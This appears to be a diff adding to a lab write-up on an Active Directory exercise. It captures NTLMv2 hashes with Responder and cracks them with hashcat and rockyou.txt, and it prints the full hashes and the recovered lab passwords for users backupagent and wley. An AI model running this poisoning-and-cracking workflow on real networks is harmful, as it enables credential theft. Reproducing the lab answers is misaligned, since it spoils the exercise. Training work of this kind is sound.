@@ -125,3 +125,39 @@ sudo responder -I ens224 -wf
 After running Responder for several minutes, it successfully captured an NTLM hash for the user account backupagent
 
 [![Screenshot-2025-03-13-141104.png](https://i.postimg.cc/Vkh6N70q/Screenshot-2025-03-13-141104.png)](https://postimg.cc/PCmh3Q4J)
+
+
+* **Crack the hash for the previous account and submit the cleartext password as your answer.**
+
+After successfully capturing the hash using Responder, I proceeded with cracking it. I navigated to Responder's Logs Directory in /usr/share/responder/logs. I extracted the NTLMv2 hash from the file and saved it into a new file named hash.txt on my attack machine for cracking.
+
+I used Hashcat, specifying the mode for NTLMv2 hashes (-m 5600), along with the rockyou.txt wordlist.
+```c
+hashcat -m 5600 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+After Hashcat finished processing, I reviewed the results by displaying the contents of cracked.txt:
+```c
+cat cracked.txt
+
+BACKUPAGENT::INLANEFREIGHT:6b6fa02e047a9ef4:5f2b8a134304247569905d3f187b8678:010100000000000080a267f81f94db010f58d0f6b87a15bc0000000002000800410055003500340001001e00570049004e002d004a005900560048004b0035005200590036004700530004003400570049004e002d004a005900560048004b003500520059003600470053002e0041005500350034002e004c004f00430041004c000300140041005500350034002e004c004f00430041004c000500140041005500350034002e004c004f00430041004c000700080080a267f81f94db010600040002000000080030003000000000000000000000000030000002d9fd7ffabf78ce55e4568fbe3ba65c01c67b75b7bee7c2347f528ecc254dba0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
+```
+
+[![Screenshot-2025-03-13-142515.png](https://i.postimg.cc/7Yd8GjXZ/Screenshot-2025-03-13-142515.png)](https://postimg.cc/D8rYRjt9)
+
+**Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.**
+
+While running Responder during the previous task, I had already captured an NTLMv2 hash for the user **wley**. I copied the captured hash from Responder’s logs and saved it into a new file called hash2.txt on my attack machine.
+```c
+hashcat -m 5600 -a 0 -o cracked2.txt hash2.txt /usr/share/wordlists/rockyou.txt
+```
+Once Hashcat completed the cracking process, I reviewed the results by running:
+
+```c
+cat cracked2.txt
+WLEY::INLANEFREIGHT:6c0dde4851063a3b:9e405760f4fca4e917989d53b08cfdf8:010100000000000080a267f81f94db0145080a739104b4e60000000002000800410055003500340001001e00570049004e002d004a005900560048004b0035005200590036004700530004003400570049004e002d004a005900560048004b003500520059003600470053002e0041005500350034002e004c004f00430041004c000300140041005500350034002e004c004f00430041004c000500140041005500350034002e004c004f00430041004c000700080080a267f81f94db010600040002000000080030003000000000000000000000000030000002d9fd7ffabf78ce55e4568fbe3ba65c01c67b75b7bee7c2347f528ecc254dba0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
+```
+[![Screenshot-2025-03-13-143007.png](https://i.postimg.cc/6qqgThvZ/Screenshot-2025-03-13-143007.png)](https://postimg.cc/gL9NT84c)
+
+
+
